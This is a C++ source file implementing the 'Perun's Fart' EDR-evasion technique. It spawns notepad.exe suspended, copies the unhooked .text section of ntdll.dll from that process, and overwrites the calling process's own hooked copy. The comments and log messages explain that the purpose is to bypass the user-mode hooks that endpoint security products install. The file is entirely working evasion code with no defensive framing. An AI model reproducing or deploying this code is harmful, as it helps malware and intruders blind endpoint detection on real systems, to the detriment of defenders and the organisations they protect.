#include "stdafx.h"
#include "peruns_fart.h"
#include "logger.h"
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

namespace PerunsFart {

bool UnhookAll() {
    VERBOSE(L"PerunsFart: Extracting clean ntdll.dll from a suspended dummy process...");

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    // 1. Create a pristine suspended dummy process 
    // Usually EDRs hook a process *after* it begins initialization. When created suspended,
    // the ntdll.dll mapped into it is often completely unmodified.
    wchar_t szDummyPath[MAX_PATH];
    ExpandEnvironmentStringsW(L"%SystemRoot%\\System32\\notepad.exe", szDummyPath, MAX_PATH);

    if (!CreateProcessW(
            szDummyPath, nullptr, nullptr, nullptr, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            nullptr, nullptr, &si, &pi)) {
        LOG(L"PerunsFart: Failed to create suspended process. Error: %u", GetLastError());
        return false;
    }

    // 2. Locate ntdll in our own process
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDosHdr->e_lfanew);
    
    // Find the .text section which contains the executable code (where hooks are placed)
    PIMAGE_SECTION_HEADER pSecHdr = IMAGE_FIRST_SECTION(pNtHdr);
    
    for (WORD i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSecHdr[i].Name, ".text", 5) == 0) {
            
            // 3. Read the pristine .text section from the dummy process
            PVOID pTextSection = (BYTE*)hNtdll + pSecHdr[i].VirtualAddress;
            SIZE_T textSize = pSecHdr[i].Misc.VirtualSize;
            
            PVOID pCleanBuffer = VirtualAlloc(nullptr, textSize, MEM_COMMIT, PAGE_READWRITE);
            
            SIZE_T bytesRead = 0;
            if (ReadProcessMemory(pi.hProcess, pTextSection, pCleanBuffer, textSize, &bytesRead)) {
                
                // 4. Temporarily remove memory protection on our own ntdll.dll
                DWORD oldProtect = 0;
                if (VirtualProtect(pTextSection, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                    
                    // 5. Overwrite the hooked .text section with the pristine one
                    memcpy(pTextSection, pCleanBuffer, textSize);
                    
                    // 6. Restore original protection
                    VirtualProtect(pTextSection, textSize, oldProtect, &oldProtect);
                    
                    LOG(L"PerunsFart: Universally unhooked ntdll.dll. Bypassed %zu bytes of potential user-mode hooks.", textSize);
                } else {
                    LOG(L"PerunsFart: Failed to change memory protection on ntdll.dll: %u", GetLastError());
                }
            } else {
                LOG(L"PerunsFart: Failed to read from suspended process: %u", GetLastError());
            }

            VirtualFree(pCleanBuffer, 0, MEM_RELEASE);
            break;
        }
    }

    // 7. Clean up the dummy process. It has served its purpose.
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

} // namespace PerunsFart
